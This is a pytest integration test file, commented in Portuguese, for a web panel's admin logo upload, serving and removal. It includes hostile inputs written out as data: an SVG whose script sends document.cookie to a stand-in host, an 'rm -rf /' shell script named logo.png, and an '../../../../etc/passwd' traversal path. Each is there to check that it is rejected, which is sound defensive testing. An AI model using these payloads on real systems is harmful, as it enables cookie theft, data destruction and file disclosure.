# tests/test_branding.py
"""A logo personalizada do painel.

🛡️ É a única rota que aceita um ficheiro de quem está autenticado e o passa a
servir em TODAS as páginas, incluindo as públicas (convite, pagamento por link,
entrada). Por isso metade destes testes é sobre o que NÃO se aceita.
"""

import io
import os
import pathlib

import pytest

from app.services import branding

pytestmark = pytest.mark.integration

PNG = b'\x89PNG\r\n\x1a\n' + b'0' * 40
JPG = b'\xff\xd8\xff\xe0' + b'0' * 40
GIF = b'GIF89a' + b'0' * 40
WEBP = b'RIFF' + b'\x00\x00\x00\x00' + b'WEBP' + b'0' * 40

# Um SVG perfeitamente válido — e com um script lá dentro, que é o ponto.
SVG_HOSTIL = (b'<svg xmlns="http://www.w3.org/2000/svg"><script>'
              b'fetch("https://exemplo.invalido/"+document.cookie)</script></svg>')


@pytest.fixture()
def limpo(config_file):
    """Config de teste e a pasta da marca vazia no fim."""
    config_file(IS_CONFIGURED=True, ADMIN_USER="dono", ADMIN_USER_ID="1")
    yield
    branding.remover_logo()


def _autenticar(client, role="admin"):
    with client.session_transaction() as sessao:
        sessao["user_details"] = {"id": "1", "username": "dono", "email": "d@e.test", "role": role}
        sessao["_user_id"] = "1"
        sessao["_fresh"] = True


def _enviar(client, dados, nome="logo.png"):
    return client.post(
        "/api/system/logo",
        data={"file": (io.BytesIO(dados), nome)},
        content_type="multipart/form-data",
    )


class TestOQueSeAceita:
    @pytest.mark.parametrize("dados,extensao", [
        (PNG, 'png'), (JPG, 'jpg'), (GIF, 'gif'), (WEBP, 'webp'),
    ])
    def test_os_formatos_raster(self, client, limpo, db_session, dados, extensao):
        _autenticar(client)

        resposta = _enviar(client, dados)

        assert resposta.status_code == 200
        assert os.path.basename(branding.logo_atual()) == f"logo.{extensao}"

    def test_o_webp_nao_tem_assinatura_no_inicio(self, limpo):
        # É um contentor RIFF com 'WEBP' no byte 8 — sem a verificação à parte,
        # um .webp válido era recusado como "formato não suportado".
        assert branding.guardar_logo(WEBP)["success"] is True

    def test_a_extensao_do_ficheiro_enviado_e_ignorada(self, client, limpo, db_session):
        # O que vale é o CONTEÚDO. Um PNG chamado .jpg grava-se como .png.
        _autenticar(client)

        _enviar(client, PNG, nome="qualquer-coisa.jpg")

        assert os.path.basename(branding.logo_atual()) == "logo.png"

    def test_a_logo_e_servida_pela_rota_publica(self, client, limpo, db_session):
        # Pública de propósito: aparece na página de entrada e no convite.
        _autenticar(client)
        _enviar(client, PNG)

        resposta = client.get("/branding/logo")

        assert resposta.status_code == 200
        assert resposta.mimetype == "image/png"
        assert resposta.headers.get("X-Content-Type-Options") == "nosniff"

    def test_sem_logo_a_rota_responde_404(self, client, limpo, db_session):
        assert client.get("/branding/logo").status_code == 404


class TestOQueSeRecusa:
    def test_o_svg_e_recusado_mesmo_sendo_uma_imagem(self, client, limpo, db_session):
        """
        🛡️ Um SVG é XML e aceita `<script>` dentro. Esta imagem aparece no
        cabeçalho de todas as páginas, incluindo as que não exigem login — um
        SVG hostil seria XSS armazenado em todo o lado, enviado pela própria
        interface de administração.
        """
        _autenticar(client)

        resposta = _enviar(client, SVG_HOSTIL, nome="logo.svg")

        assert resposta.status_code == 400
        assert "SVG" in resposta.get_json()["message"]
        assert branding.logo_atual() is None

    def test_um_ficheiro_que_nao_e_imagem_e_recusado(self, client, limpo, db_session):
        _autenticar(client)

        resposta = _enviar(client, b'#!/bin/sh\nrm -rf /\n', nome="logo.png")

        assert resposta.status_code == 400
        assert branding.logo_atual() is None

    def test_uma_imagem_grande_de_mais_e_recusada(self, client, limpo, db_session):
        _autenticar(client)

        resposta = _enviar(client, PNG + b'0' * branding.TAMANHO_MAXIMO)

        assert resposta.status_code == 400
        assert branding.logo_atual() is None

    def test_um_envio_vazio_e_recusado(self, client, limpo, db_session):
        _autenticar(client)

        assert _enviar(client, b'').status_code == 400

    def test_so_o_administrador_envia(self, client, limpo, db_session):
        _autenticar(client, role="user")

        assert _enviar(client, PNG).status_code in (302, 401, 403)
        assert branding.logo_atual() is None

    def test_quem_nao_entrou_nao_envia(self, client, limpo, db_session):
        assert _enviar(client, PNG).status_code in (302, 401, 403)


class TestRemocao:
    def test_remover_volta_ao_simbolo_padrao(self, client, limpo, db_session):
        _autenticar(client)
        _enviar(client, PNG)

        resposta = client.delete("/api/system/logo")

        assert resposta.status_code == 200
        assert branding.logo_atual() is None
        assert client.get("/branding/logo").status_code == 404

    def test_remover_sem_haver_logo_nao_e_erro(self, client, limpo, db_session):
        _autenticar(client)

        assert client.delete("/api/system/logo").status_code == 200

    def test_trocar_de_formato_nao_deixa_o_ficheiro_antigo(self, client, limpo, db_session):
        # Sem isto, um PNG seguido de um JPG deixava o logo.png na pasta para
        # sempre — e a pasta é o volume do utilizador.
        _autenticar(client)
        _enviar(client, PNG)
        pasta = os.path.dirname(branding.logo_atual())

        _enviar(client, JPG)

        assert sorted(os.listdir(pasta)) == ["logo.jpg"]


class TestNosTemplates:
    def test_sem_logo_a_pagina_mostra_o_simbolo_padrao(self, client, limpo, db_session):
        _autenticar(client)

        pagina = client.get("/account").get_data(as_text=True)

        assert "/branding/logo" not in pagina
        assert "M12.0001 1.5C11.3001" in pagina

    def test_com_logo_a_pagina_usa_a_imagem(self, client, limpo, db_session):
        _autenticar(client)
        _enviar(client, PNG)

        pagina = client.get("/account").get_data(as_text=True)

        assert "/branding/logo" in pagina

    def test_a_pagina_de_entrada_tambem(self, client, limpo, db_session):
        # É pública, e é onde a marca mais conta. Sem sessão nenhuma: é assim
        # que a vê quem ainda não entrou.
        branding.guardar_logo(PNG)

        pagina = client.get("/auth/login").get_data(as_text=True)

        assert "/branding/logo" in pagina

    def test_o_macro_ve_o_contexto_do_template(self, client, limpo, db_session):
        """
        🐛 Um macro importado com `{% import %}` NÃO vê o contexto do template
        por omissão — é preciso `with context`. Sem isso, o `app_logo_url` era
        indefinido lá dentro e a logo personalizada NUNCA aparecia, em página
        nenhuma, sem erro nenhum.
        """
        marcador = "{% import 'partials/logo.html' as logo %}"
        for template in pathlib.Path("app/templates").rglob("*.html"):
            texto = template.read_text(encoding="utf-8")
            assert marcador not in texto, (
                f"{template} importa o macro da logo sem `with context` — "
                "a logo personalizada não vai aparecer nessa página."
            )


class TestCaminhosSeguros:
    def test_um_nome_com_travessia_no_config_nao_le_fora_da_pasta(self, limpo, config_file):
        """
        🛡️ O nome é sempre gerado pelo painel, mas o config.json pode ser
        editado à mão ou vir de um backup adulterado. O `basename` é o que
        impede que isso vire uma leitura de ficheiro arbitrário.
        """
        config_file(IS_CONFIGURED=True, APP_LOGO_FILE="../../../../etc/passwd")

        assert branding.logo_atual() is None

    def test_um_ficheiro_que_sumiu_conta_como_sem_logo(self, limpo):
        branding.guardar_logo(PNG)
        os.remove(branding.logo_atual())

        assert branding.logo_atual() is None
